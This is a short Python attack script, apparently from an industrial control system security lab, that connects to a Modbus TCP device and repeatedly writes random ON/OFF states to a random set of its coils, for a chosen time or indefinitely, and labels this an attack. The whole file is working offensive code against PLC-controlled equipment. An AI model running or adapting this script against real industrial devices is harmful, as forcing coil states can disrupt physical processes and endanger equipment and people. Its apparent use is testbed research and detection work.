import time
import struct
import random
import argparse
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
from utils import read_memory, write_memory, get_enabled_coils, random_dict_from_list

parser = argparse.ArgumentParser(
    description="Coil Manipulator - Writes random ON/OFF states to random Modbus coils",
    usage="python3 coil_manipulator.py --duration <DURATION>"
)

parser.add_argument("--duration", help="Duration of the attack (0 = infinite)", type=int, required=False, default=0)

args = parser.parse_args()

# Connect to Modbus device
try:
    client = ModbusTcpClient(host="192.168.60.3", port=502)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)
except Exception as e:
    print(Fore.RED + "The IP address or the port is incorrect. Please check the configurations." + Style.RESET_ALL)
    exit(1)

max_coils = 71
n_coils = random.randint(1, max_coils)

total_coils_to_manipulate = [i for i in range(max_coils)]
random_dict = random_dict_from_list(total_coils_to_manipulate, n_coils)


# Set up duration
start_time = time.time()
if args.duration > 0:
    end_time = start_time + args.duration
    infinite = False
else:
    infinite = True
    end_time = float('inf')

try:
    while time.time() < end_time:
        now = time.time()
        for coil, status in random_dict.items():
            client.write_coil(coil, bool(status))
    
    for coil in range(1, max_coils):
        client.write_coil(coil, False)
    client.write_coil(0, True)
    

except KeyboardInterrupt:
    print(Fore.CYAN + "\nAttack interrupted by user." + Style.RESET_ALL)
finally:
    client.close()
    print(Fore.GREEN + "Connection closed." + Style.RESET_ALL)